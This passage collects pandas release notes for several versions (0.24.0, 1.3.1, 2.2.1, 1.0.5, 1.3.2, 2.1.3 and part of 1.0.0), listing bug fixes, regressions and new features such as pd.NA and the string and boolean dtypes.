resampling by a weekly offset (``'W'``) across a DST transition (:issue:`9119`, :issue:`21459`)\n- Bug in :meth:`DataFrame.expanding` in which the ``axis`` argument was not being respected during aggregations (:issue:`23372`)\n- Bug in :meth:`.GroupBy.transform` which caused missing values when the input function can accept a :class:`DataFrame` but renames it (:issue:`23455`).\n- Bug in :func:`.GroupBy.nth` where column order was not always preserved (:issue:`20760`)\n- Bug in :meth:`.GroupBy.rank` with ``method='dense'`` and ``pct=True`` when a group has only one member would raise a ``ZeroDivisionError`` (:issue:`23666`).\n- Calling :meth:`.GroupBy.rank` with empty groups and ``pct=True`` was raising a ``ZeroDivisionError`` (:issue:`22519`)\n- Bug in :meth:`DataFrame.resample` when resampling ``NaT`` in ``TimeDeltaIndex`` (:issue:`13223`).\n- Bug in :meth:`DataFrame.groupby` did not respect the ``observed`` argument when selecting a column and instead always used ``observed=False`` (:issue:`23970`)\n- Bug in :func:`.SeriesGroupBy.pct_change` or :func:`.DataFrameGroupBy.pct_change` would previously work across groups when calculating the percent change, where it now correctly works per group (:issue:`21200`, :issue:`21235`).\n- Bug preventing hash table creation with very large number (2^32) of rows (:issue:`22805`)\n- Bug in groupby when grouping on categorical causes ``ValueError`` and incorrect grouping if ``observed=True`` and ``nan`` is present in categorical column (:issue:`24740`, :issue:`21151`).\n\nReshaping\n^^^^^^^^^\n\n- Bug in :func:`pandas.concat` when joining resampled DataFrames with timezone aware index (:issue:`13783`)\n- Bug in :func:`pandas.concat` when joining only ``Series`` the ``names`` argument of ``concat`` is no longer ignored (:issue:`23490`)\n- Bug in :meth:`Series.combine_first` with ``datetime64[ns, tz]`` dtype which would return tz-naive result (:issue:`21469`)\n- Bug in :meth:`Series.where` and :meth:`DataFrame.where` with ``datetime64[ns, tz]`` dtype (:issue:`21546`)\n- Bug in :meth:`DataFrame.where` with an empty DataFrame and empty ``cond`` having non-bool dtype (:issue:`21947`)\n- Bug in :meth:`Series.mask` and :meth:`DataFrame.mask` with ``list`` conditionals (:issue:`21891`)\n- Bug in :meth:`DataFrame.replace` raises RecursionError when converting OutOfBounds ``datetime64[ns, tz]`` (:issue:`20380`)\n- :func:`.GroupBy.rank` now raises a ``ValueError`` when an invalid value is passed for argument ``na_option`` (:issue:`22124`)\n- Bug in :func:`get_dummies` with Unicode attributes in Python 2 (:issue:`22084`)\n- Bug in :meth:`DataFrame.replace` raises ``RecursionError`` when replacing empty lists (:issue:`22083`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` when dict is used as the ``to_replace`` value and one key in the dict is another key's value, the results were inconsistent between using integer key and using string key (:issue:`20656`)\n- Bug in :meth:`DataFrame.drop_duplicates` for empty ``DataFrame`` which incorrectly raises an error (:issue:`20516`)\n- Bug in :func:`pandas.wide_to_long` when a string is passed to the stubnames argument and a column name is a substring of that stubname (:issue:`22468`)\n- Bug in :func:`merge` when merging ``datetime64[ns, tz]`` data that contained a DST transition (:issue:`18885`)\n- Bug in :func:`merge_asof` when merging on float values within defined tolerance (:issue:`22981`)\n- Bug in :func:`pandas.concat` when concatenating a multicolumn DataFrame with tz-aware data against a DataFrame with a different number of columns (:issue:`22796`)\n- Bug in :func:`merge_asof` where confusing error message raised when attempting to merge with missing values (:issue:`23189`)\n- Bug in :meth:`DataFrame.nsmallest` and :meth:`DataFrame.nlargest` for dataframes that have a :class:`MultiIndex` for columns (:issue:`23033`).\n- Bug in :func:`pandas.melt` when passing column names that are not present in ``DataFrame`` (:issue:`23575`)\n- Bug in :meth:`DataFrame.append` with a :class:`Series` with a dateutil timezone would raise a ``TypeError`` (:issue:`23682`)\n- Bug in :class:`Series` construction when passing no data and ``dtype=str`` (:issue:`22477`)\n- Bug in :func:`cut` with ``bins`` as an overlapping ``IntervalIndex`` where multiple bins were returned per item instead of raising a ``ValueError`` (:issue:`23980`)\n- Bug in :func:`pandas.concat` when joining ``Series`` datetimetz with ``Series`` category would lose timezone (:issue:`23816`)\n- Bug in :meth:`DataFrame.join` when joining on partial MultiIndex would drop names (:issue:`20452`).\n- :meth:`DataFrame.nlargest` and :meth:`DataFrame.nsmallest` now returns the correct n values when keep != 'all' also when tied on the first columns (:issue:`22752`)\n- Constructing a DataFrame with an index argument that wasn't already an instance of :class:`.Index` was broken (:issue:`22227`).\n- Bug in :class:`DataFrame` prevented list subclasses to be used to construction (:issue:`21226`)\n- Bug in :func:`DataFrame.unstack` and :func:`DataFrame.pivot_table` returning a misleading error message when the resulting DataFrame has more elements than int32 can handle. Now, the error message is improved, pointing towards the actual problem (:issue:`20601`)\n- Bug in :func:`DataFrame.unstack` where a ``ValueError`` was raised when unstacking timezone aware values (:issue:`18338`)\n- Bug in :func:`DataFrame.stack` where timezone aware values were converted to timezone naive values (:issue:`19420`)\n- Bug in :func:`merge_asof` where a ``TypeError`` was raised when ``by_col`` were timezone aware values (:issue:`21184`)\n- Bug showing an incorrect shape when throwing error during ``DataFrame`` construction. (:issue:`20742`)\n\n.. _whatsnew_0240.bug_fixes.sparse:\n\nSparse\n^^^^^^\n\n- Updating a boolean, datetime, or timedelta column to be Sparse now works (:issue:`22367`)\n- Bug in :meth:`Series.to_sparse` with Series already holding sparse data not constructing properly (:issue:`22389`)\n- Providing a ``sparse_index`` to the SparseArray constructor no longer defaults the na-value to ``np.nan`` for all dtypes. The correct na_value for ``data.dtype`` is now used.\n- Bug in ``SparseArray.nbytes`` under-reporting its memory usage by not including the size of its sparse index.\n- Improved performance of :meth:`Series.shift` for non-NA ``fill_value``, as values are no longer converted to a dense array.\n- Bug in ``DataFrame.groupby`` not including ``fill_value`` in the groups for non-NA ``fill_value`` when grouping by a sparse column (:issue:`5078`)\n- Bug in unary inversion operator (``~``) on a ``SparseSeries`` with boolean values. The performance of this has also been improved (:issue:`22835`)\n- Bug in :meth:`SparseArary.unique` not returning the unique values (:issue:`19595`)\n- Bug in :meth:`SparseArray.nonzero` and :meth:`SparseDataFrame.dropna` returning shifted/incorrect results (:issue:`21172`)\n- Bug in :meth:`DataFrame.apply` where dtypes would lose sparseness (:issue:`23744`)\n- Bug in :func:`concat` when concatenating a list of :class:`Series` with all-sparse values changing the ``fill_value`` and converting to a dense Series (:issue:`24371`)\n\nStyle\n^^^^^\n\n- :meth:`~pandas.io.formats.style.Styler.background_gradient` now takes a ``text_color_threshold`` parameter to automatically lighten the text color based on the luminance of the background color. This improves readability with dark background colors without the need to limit the background colormap range. (:issue:`21258`)\n- :meth:`~pandas.io.formats.style.Styler.background_gradient` now also supports tablewise application (in addition to rowwise and columnwise) with ``axis=None`` (:issue:`15204`)\n- :meth:`~pandas.io.formats.style.Styler.bar` now also supports tablewise application (in addition to rowwise and columnwise) with ``axis=None`` and setting clipping range with ``vmin`` and ``vmax`` (:issue:`21548` and :issue:`21526`). ``NaN`` values are also handled properly.\n\nBuild changes\n^^^^^^^^^^^^^\n\n- Building pandas for development now requires ``cython >= 0.28.2`` (:issue:`21688`)\n- Testing pandas now requires ``hypothesis>=3.58``.  You can find `the Hypothesis docs here <https://hypothesis.readthedocs.io/en/latest/index.html>`_, and a pandas-specific introduction :ref:`in the contributing guide <using-hypothesis>`. (:issue:`22280`)\n- Building pandas on macOS now targets minimum macOS 10.9 if run on macOS 10.9 or above (:issue:`23424`)\n\nOther\n^^^^^\n\n- Bug where C variables were declared with external linkage causing import errors if certain other C libraries were imported before pandas. (:issue:`24113`)\n\n\n.. _whatsnew_0.24.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.23.4..v0.24.0\n\n\n.. _whatsnew_131:\n\nWhat's new in 1.3.1 (July 25, 2021)\n-----------------------------------\n\nThese are the changes in pandas 1.3.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Pandas could not be built on PyPy (:issue:`42355`)\n- :class:`DataFrame` constructed with an older version of pandas could not be unpickled (:issue:`42345`)\n- Performance regression in constructing a :class:`DataFrame` from a dictionary of dictionaries (:issue:`42248`)\n- Fixed regression in :meth:`DataFrame.agg` dropping values when the DataFrame had an Extension Array dtype, a duplicate index, and ``axis=1`` (:issue:`42380`)\n- Fixed regression in :meth:`DataFrame.astype` changing the order of noncontiguous data (:issue:`42396`)\n- Performance regression in :class:`DataFrame` in reduction operations requiring casting such as :meth:`DataFrame.mean` on integer data (:issue:`38592`)\n- Performance regression in :meth:`DataFrame.to_dict` and :meth:`Series.to_dict` when ``orient`` argument one of \"records\", \"dict\", or \"split\" (:issue:`42352`)\n- Fixed regression in indexing with a ``list`` subclass incorrectly raising ``TypeError`` (:issue:`42433`, :issue:`42461`)\n- Fixed regression in :meth:`DataFrame.isin` and :meth:`Series.isin` raising ``TypeError`` with nullable data containing at least one missing value (:issue:`42405`)\n- Regression in :func:`concat` between objects with bool dtype and integer dtype casting to object instead of to integer (:issue:`42092`)\n- Bug in :class:`Series` constructor not accepting a ``dask.Array`` (:issue:`38645`)\n- Fixed regression for ``SettingWithCopyWarning`` displaying incorrect stacklevel (:issue:`42570`)\n- Fixed regression for :func:`merge_asof` raising ``KeyError`` when one of the ``by`` columns is in the index (:issue:`34488`)\n- Fixed regression in :func:`to_datetime` returning pd.NaT for inputs that produce duplicated values, when ``cache=True`` (:issue:`42259`)\n- Fixed regression in :meth:`SeriesGroupBy.value_counts` that resulted in an ``IndexError`` when called on a Series with one row (:issue:`42618`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :meth:`DataFrame.transpose` dropping values when the DataFrame had an Extension Array dtype and a duplicate index (:issue:`42380`)\n- Fixed bug in :meth:`DataFrame.to_xml` raising ``KeyError`` when called with ``index=False`` and an offset index (:issue:`42458`)\n- Fixed bug in :meth:`.Styler.set_sticky` not handling index names correctly for single index columns case (:issue:`42537`)\n- Fixed bug in :meth:`DataFrame.copy` failing to consolidate blocks in the result (:issue:`42579`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_131.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.0..v1.3.1\n\n\n.. _whatsnew_221:\n\nWhat's new in 2.2.1 (February 22, 2024)\n---------------------------------------\n\nThese are the changes in pandas 2.2.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n- Added ``pyarrow`` pip extra so users can install pandas and pyarrow with pip with ``pip install pandas[pyarrow]`` (:issue:`54466`)\n\n.. _whatsnew_221.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed memory leak in :func:`read_csv` (:issue:`57039`)\n- Fixed performance regression in :meth:`Series.combine_first` (:issue:`55845`)\n- Fixed regression causing overflow for near-minimum timestamps (:issue:`57150`)\n- Fixed regression in :func:`concat` changing long-standing behavior that always sorted the non-concatenation axis when the axis was a :class:`DatetimeIndex` (:issue:`57006`)\n- Fixed regression in :func:`merge_ordered` raising ``TypeError`` for ``fill_method=\"ffill\"`` and ``how=\"left\"`` (:issue:`57010`)\n- Fixed regression in :func:`pandas.testing.assert_series_equal` defaulting to ``check_exact=True`` when checking the :class:`Index` (:issue:`57067`)\n- Fixed regression in :func:`read_json` where an :class:`Index` would be returned instead of a :class:`RangeIndex` (:issue:`57429`)\n- Fixed regression in :func:`wide_to_long` raising an ``AttributeError`` for string columns (:issue:`57066`)\n- Fixed regression in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.SeriesGroupBy.idxmax` ignoring the ``skipna`` argument (:issue:`57040`)\n- Fixed regression in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.SeriesGroupBy.idxmax` where values containing the minimum or maximum value for the dtype could produce incorrect results (:issue:`57040`)\n- Fixed regression in :meth:`CategoricalIndex.difference` raising ``KeyError`` when other contains null values other than NaN (:issue:`57318`)\n- Fixed regression in :meth:`DataFrame.groupby` raising ``ValueError`` when grouping by a :class:`Series` in some cases (:issue:`57276`)\n- Fixed regression in :meth:`DataFrame.loc` raising ``IndexError`` for non-unique, masked dtype indexes where result has more than 10,000 rows (:issue:`57027`)\n- Fixed regression in :meth:`DataFrame.loc` which was unnecessarily throwing \"incompatible dtype warning\" when expanding with partial row indexer and multiple columns (see `PDEP6 <https://pandas.pydata.org/pdeps/0006-ban-upcasting.html>`_) (:issue:`56503`)\n- Fixed regression in :meth:`DataFrame.map` with ``na_action=\"ignore\"`` not being respected for NumPy nullable and :class:`ArrowDtypes` (:issue:`57316`)\n- Fixed regression in :meth:`DataFrame.merge` raising ``ValueError`` for certain types of 3rd-party extension arrays (:issue:`57316`)\n- Fixed regression in :meth:`DataFrame.query` with all ``NaT`` column with object dtype (:issue:`57068`)\n- Fixed regression in :meth:`DataFrame.shift` raising ``AssertionError`` for ``axis=1`` and empty :class:`DataFrame` (:issue:`57301`)\n- Fixed regression in :meth:`DataFrame.sort_index` not producing a stable sort for a index with duplicates (:issue:`57151`)\n- Fixed regression in :meth:`DataFrame.to_dict` with ``orient='list'`` and datetime or timedelta types returning integers (:issue:`54824`)\n- Fixed regression in :meth:`DataFrame.to_json` converting nullable integers to floats (:issue:`57224`)\n- Fixed regression in :meth:`DataFrame.to_sql` when ``method=\"multi\"`` is passed and the dialect type is not Oracle (:issue:`57310`)\n- Fixed regression in :meth:`DataFrame.transpose` with nullable extension dtypes not having F-contiguous data potentially causing exceptions when used (:issue:`57315`)\n- Fixed regression in :meth:`DataFrame.update` emitting incorrect warnings about downcasting (:issue:`57124`)\n- Fixed regression in :meth:`DataFrameGroupBy.idxmin`, :meth:`DataFrameGroupBy.idxmax`, :meth:`SeriesGroupBy.idxmin`, :meth:`SeriesGroupBy.idxmax` ignoring the ``skipna`` argument (:issue:`57040`)\n- Fixed regression in :meth:`DataFrameGroupBy.idxmin`, :meth:`DataFrameGroupBy.idxmax`, :meth:`SeriesGroupBy.idxmin`, :meth:`SeriesGroupBy.idxmax` where values containing the minimum or maximum value for the dtype could produce incorrect results (:issue:`57040`)\n- Fixed regression in :meth:`ExtensionArray.to_numpy` raising for non-numeric masked dtypes (:issue:`56991`)\n- Fixed regression in :meth:`Index.join` raising ``TypeError`` when joining an empty index to a non-empty index containing mixed dtype values (:issue:`57048`)\n- Fixed regression in :meth:`Series.astype` introducing decimals when converting from integer with missing values to string dtype (:issue:`57418`)\n- Fixed regression in :meth:`Series.pct_change` raising a ``ValueError`` for an empty :class:`Series` (:issue:`57056`)\n- Fixed regression in :meth:`Series.to_numpy` when dtype is given as float and the data contains NaNs (:issue:`57121`)\n- Fixed regression in addition or subtraction of :class:`DateOffset` objects with millisecond components to ``datetime64`` :class:`Index`, :class:`Series`, or :class:`DataFrame` (:issue:`57529`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which was raising for Nullable integers (:issue:`55069`)\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which was raising for empty inputs (:issue:`56700`)\n- Fixed bug in :func:`pandas.api.interchange.from_dataframe` which wasn't converting columns names to strings (:issue:`55069`)\n- Fixed bug in :meth:`DataFrame.__getitem__` for empty :class:`DataFrame` with Copy-on-Write enabled (:issue:`57130`)\n- Fixed bug in :meth:`PeriodIndex.asfreq` which was silently converting frequencies which are not supported as period frequencies instead of raising an error (:issue:`56945`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.other:\n\nOther\n~~~~~\n\n.. note::\n\n    The ``DeprecationWarning`` that was raised when pandas was imported without PyArrow being\n    installed has been removed. This decision was made because the warning was too noisy for too\n    many users and a lot of feedback was collected about the decision to make PyArrow a required\n    dependency. Pandas is currently considering the decision whether or not PyArrow should be added\n    as a hard dependency in 3.0. Interested users can follow the discussion\n    `here <https://github.com/pandas-dev/pandas/issues/57073>`_.\n\n- Added the argument ``skipna`` to :meth:`DataFrameGroupBy.first`, :meth:`DataFrameGroupBy.last`, :meth:`SeriesGroupBy.first`, and :meth:`SeriesGroupBy.last`; achieving ``skipna=False`` used to be available via :meth:`DataFrameGroupBy.nth`, but the behavior was changed in pandas 2.0.0 (:issue:`57019`)\n- Added the argument ``skipna`` to :meth:`Resampler.first`, :meth:`Resampler.last` (:issue:`57019`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_221.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.2.0..v2.2.1\n\n\n\n.. _whatsnew_105:\n\nWhat's new in 1.0.5 (June 17, 2020)\n-----------------------------------\n\nThese are the changes in pandas 1.0.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_105.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fix regression in :meth:`read_parquet` when reading from file-like objects\n  (:issue:`34467`).\n- Fix regression in reading from public S3 buckets (:issue:`34626`).\n\nNote this disables the ability to read Parquet files from directories on S3\nagain (:issue:`26388`, :issue:`34632`), which was added in the 1.0.4 release,\nbut is now targeted for pandas 1.1.0.\n\n- Fixed regression in :meth:`~DataFrame.replace` raising an ``AssertionError`` when replacing values in an extension dtype with values of a different dtype (:issue:`34530`)\n\n.. _whatsnew_105.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Fixed building from source with Python 3.8 fetching the wrong version of NumPy (:issue:`34666`)\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.0.4..v1.0.5|HEAD\n\n\n.. _whatsnew_132:\n\nWhat's new in 1.3.2 (August 15, 2021)\n-------------------------------------\n\nThese are the changes in pandas 1.3.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Performance regression in :meth:`DataFrame.isin` and :meth:`Series.isin` for nullable data types (:issue:`42714`)\n- Regression in updating values of :class:`Series` using boolean index, created by using :meth:`DataFrame.pop` (:issue:`42530`)\n- Regression in :meth:`DataFrame.from_records` with empty records (:issue:`42456`)\n- Fixed regression in :meth:`DataFrame.shift` where ``TypeError`` occurred when shifting DataFrame created by concatenation of slices and fills with values (:issue:`42719`)\n- Regression in :meth:`DataFrame.agg` when the ``func`` argument returned lists and ``axis=1`` (:issue:`42727`)\n- Regression in :meth:`DataFrame.drop` does nothing if :class:`MultiIndex` has duplicates and indexer is a tuple or list of tuples (:issue:`42771`)\n- Fixed regression where :func:`read_csv` raised a ``ValueError`` when parameters ``names`` and ``prefix`` were both set to ``None`` (:issue:`42387`)\n- Fixed regression in comparisons between :class:`Timestamp` object and ``datetime64`` objects outside the implementation bounds for nanosecond ``datetime64`` (:issue:`42794`)\n- Fixed regression in :meth:`.Styler.highlight_min` and :meth:`.Styler.highlight_max` where ``pandas.NA`` was not successfully ignored (:issue:`42650`)\n- Fixed regression in :func:`concat` where ``copy=False`` was not honored in ``axis=1`` Series concatenation (:issue:`42501`)\n- Regression in :meth:`Series.nlargest` and :meth:`Series.nsmallest` with nullable integer or float dtype (:issue:`42816`)\n- Fixed regression in :meth:`Series.quantile` with :class:`Int64Dtype` (:issue:`42626`)\n- Fixed regression in :meth:`Series.groupby` and :meth:`DataFrame.groupby` where supplying the ``by`` argument with a Series named with a tuple would incorrectly raise (:issue:`42731`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`read_excel` modifies the dtypes dictionary when reading a file with duplicate columns (:issue:`42462`)\n- 1D slices over extension types turn into N-dimensional slices over ExtensionArrays (:issue:`42430`)\n- Fixed bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not calculating window bounds correctly for the first row when ``center=True`` and ``window`` is an offset that covers all the rows (:issue:`42753`)\n- :meth:`.Styler.hide_columns` now hides the index name header row as well as column headers (:issue:`42101`)\n- :meth:`.Styler.set_sticky` has amended CSS to control the column/index names and ensure the correct sticky positions (:issue:`42537`)\n- Bug in de-serializing datetime indexes in PYTHONOPTIMIZED mode (:issue:`42866`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.1..v1.3.2\n\n\n.. _whatsnew_213:\n\nWhat's new in 2.1.3 (November 10, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed infinite recursion from operations that return a new object on some DataFrame subclasses (:issue:`55763`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`DatetimeIndex.diff` raising ``TypeError`` (:issue:`55080`)\n- Bug in :meth:`Index.isin` raising for Arrow backed string and ``None`` value (:issue:`55821`)\n- Fix :func:`read_parquet` and :func:`read_feather` for `CVE-2023-47248 <https://www.cve.org/CVERecord?id=CVE-2023-47248>`__ (:issue:`55894`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_213.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.2..v2.1.3|HEAD\n\n\n.. _whatsnew_100:\n\nWhat's new in 1.0.0 (January 29, 2020)\n--------------------------------------\n\nThese are the changes in pandas 1.0.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n.. note::\n\n    The pandas 1.0 release removed a lot of functionality that was deprecated\n    in previous releases (see :ref:`below <whatsnew_100.prior_deprecations>`\n    for an overview). It is recommended to first upgrade to pandas 0.25 and to\n    ensure your code is working without warnings, before upgrading to pandas\n    1.0.\n\n\nNew deprecation policy\n~~~~~~~~~~~~~~~~~~~~~~\n\nStarting with pandas 1.0.0, pandas will adopt a variant of `SemVer`_ to\nversion releases. Briefly,\n\n* Deprecations will be introduced in minor releases (e.g. 1.1.0, 1.2.0, 2.1.0, ...)\n* Deprecations will be enforced in major releases (e.g. 1.0.0, 2.0.0, 3.0.0, ...)\n* API-breaking changes will be made only in major releases (except for experimental features)\n\nSee :ref:`policies.version` for more.\n\n.. _2019 Pandas User Survey: https://pandas.pydata.org/community/blog/2019-user-survey.html\n.. _SemVer: https://semver.org\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_100.numba_rolling_apply:\n\nUsing Numba in ``rolling.apply`` and ``expanding.apply``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added an ``engine`` keyword to :meth:`~core.window.rolling.Rolling.apply` and :meth:`~core.window.expanding.Expanding.apply`\nthat allows the user to execute the routine using `Numba <https://numba.pydata.org/>`__ instead of Cython.\nUsing the Numba engine can yield significant performance gains if the apply function can operate on numpy arrays and\nthe data set is larger (1 million rows or greater). For more details, see\n:ref:`rolling apply documentation <window.numba_engine>` (:issue:`28987`, :issue:`30936`)\n\n.. _whatsnew_100.custom_window:\n\nDefining custom windows for rolling operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added a :func:`pandas.api.indexers.BaseIndexer` class that allows users to define how\nwindow bounds are created during ``rolling`` operations. Users can define their own ``get_window_bounds``\nmethod on a :func:`pandas.api.indexers.BaseIndexer` subclass that will generate the start and end\nindices used for each window during the rolling aggregation. For more details and example usage, see\nthe :ref:`custom window rolling documentation <window.custom_rolling_window>`\n\n.. _whatsnew_100.to_markdown:\n\nConverting to markdown\n^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :meth:`~DataFrame.to_markdown` for creating a markdown table (:issue:`11052`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [1, 2, 3]}, index=['a', 'a', 'b'])\n   print(df.to_markdown())\n\nExperimental new features\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_100.NA:\n\nExperimental ``NA`` scalar to denote missing values\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new ``pd.NA`` value (singleton) is introduced to represent scalar missing\nvalues. Up to now, pandas used several values to represent missing data: ``np.nan`` is used for this for float data, ``np.nan`` or\n``None`` for object-dtype data and ``pd.NaT`` for datetime-like data. The\ngoal of ``pd.NA`` is to provide a \"missing\" indicator that can be used\nconsistently across data types. ``pd.NA`` is currently used by the nullable integer and boolean\ndata types and the new string data type (:issue:`28095`).\n\n.. warning::\n\n   Experimental: the behaviour of ``pd.NA`` can still change without warning.\n\nFor example, creating a Series using the nullable integer dtype:\n\n.. ipython:: python\n\n    s = pd.Series([1, 2, None], dtype=\"Int64\")\n    s\n    s[2]\n\nCompared to ``np.nan``, ``pd.NA`` behaves differently in certain operations.\nIn addition to arithmetic operations, ``pd.NA`` also propagates as \"missing\"\nor \"unknown\" in comparison operations:\n\n.. ipython:: python\n\n    np.nan > 1\n    pd.NA > 1\n\nFor logical operations, ``pd.NA`` follows the rules of the\n`three-valued logic <https://en.wikipedia.org/wiki/Three-valued_logic>`__ (or\n*Kleene logic*). For example:\n\n.. ipython:: python\n\n    pd.NA | True\n\nFor more, see :ref:`NA section <missing_data.NA>` in the user guide on missing\ndata.\n\n\n.. _whatsnew_100.string:\n\nDedicated string data type\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`StringDtype`, an extension type dedicated to string data.\nPreviously, strings were typically stored in object-dtype NumPy arrays. (:issue:`29975`)\n\n.. warning::\n\n   ``StringDtype`` is currently considered experimental. The implementation\n   and parts of the API may change without warning.\n\nThe ``'string'`` extension type solves several issues with object-dtype NumPy arrays:\n\n1. You can accidentally store a *mixture* of strings and non-strings in an\n   ``object`` dtype array. A ``StringArray`` can only store strings.\n2. ``object`` dtype breaks dtype-specific operations like :meth:`DataFrame.select_dtypes`.\n   There isn't a clear way to select *just* text while excluding non-text,\n   but still object-dtype columns.\n3. When reading code, the contents of an ``object`` dtype array is less clear\n   than ``string``.\n\n\n.. ipython:: python\n\n   pd.Series(['abc', None, 'def'], dtype=pd.StringDtype())\n\nYou can use the alias ``\"string\"`` as well.\n\n.. ipython:: python\n\n   s = pd.Series(['abc', None, 'def'], dtype=\"string\")\n   s\n\nThe usual string accessor methods work. Where appropriate, the return type\nof the Series or columns of a DataFrame will also have string dtype.\n\n.. ipython:: python\n\n   s.str.upper()\n   s.str.split('b', expand=True).dtypes\n\nString accessor methods returning integers will return a value with :class:`Int64Dtype`\n\n.. ipython:: python\n\n   s.str.count(\"a\")\n\nWe recommend explicitly using the ``string`` data type when working with strings.\nSee :ref:`text.types` for more.\n\n.. _whatsnew_100.boolean:\n\nBoolean data type with missing values support\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`BooleanDtype` / :class:`~arrays.BooleanArray`, an extension\ntype dedicated to boolean data that can hold missing values. The default\n``bool`` data type based on a bool-dtype NumPy array, the column can only hold\n``True`` or ``False``, and not missing values. This new :class:`~arrays.BooleanArray`\ncan store missing values as well by keeping track of this in a separate mask.\n(:issue:`29555`, :issue:`30095`, :issue:`31131`)\n\n.. ipython:: python\n\n   pd.Series([True, False, None], dtype=pd.BooleanDtype())\n\nYou can use the alias ``\"boolean\"`` as well.\n\n.. ipython:: python\n\n   s = pd.Series([True, False, None], dtype=\"boolean\")\n   s\n\n.. _whatsnew_100.convert_dtypes:\n\nMethod ``convert_dtypes`` to ease use of supported extension dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn order to encourage use of the extension dtypes ``StringDtype``,\n``BooleanDtype``, ``Int64Dtype``, ``Int32Dtype``, etc., that support ``pd.NA``, the\nmethods :meth:`DataFrame.convert_dtypes` and :meth:`Series.convert_dtypes`\nhave been introduced. (:issue:`29752`) (:issue:`30929`)\n\nExample:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'x': ['abc', None, 'def'],\n                      'y': [1, 2, np.nan],\n                      'z': [True, False, True]})\n   df\n   df.dtypes\n\n.. ipython:: python\n\n   converted = df.convert_dtypes()\n   converted\n   converted.dtypes\n\nThis is especially useful after reading in data using readers such as :func:`read_csv`\nand :func:`read_excel`.\nSee :ref:`here <missing_data.NA.conversion>` for a description.\n\n\n.. _whatsnew_100.enhancements.other:\n\nOther enhancements\n~~~~~~~~~~~~~~~~~~\n\n- :meth:`DataFrame.to_string` added the ``max_colwidth`` parameter to control when wide columns are truncated (:issue:`9784`)\n- Added the ``na_value`` argument to :meth:`Series.to_numpy`, :meth:`Index.to_numpy` and :meth:`DataFrame.to_numpy` to control the value used for missing data (:issue:`30322`)\n- :meth:`MultiIndex.from_product` infers level names from inputs if not explicitly provided (:issue:`27292`)\n- :meth:`DataFrame.to_latex` now accepts ``caption`` and ``label`` arguments (:issue:`25436`)\n- DataFrames with :ref:`nullable integer <integer_na>`, the :ref:`new string dtype <text.types>`\n  and period data type can now be converted to ``pyarrow`` (>=0.15.0), which means that it is\n  supported in writing to the Parquet file format when using the ``pyarrow`` engine (:issue:`28368`).\n  Full roundtrip to parquet (writing and reading 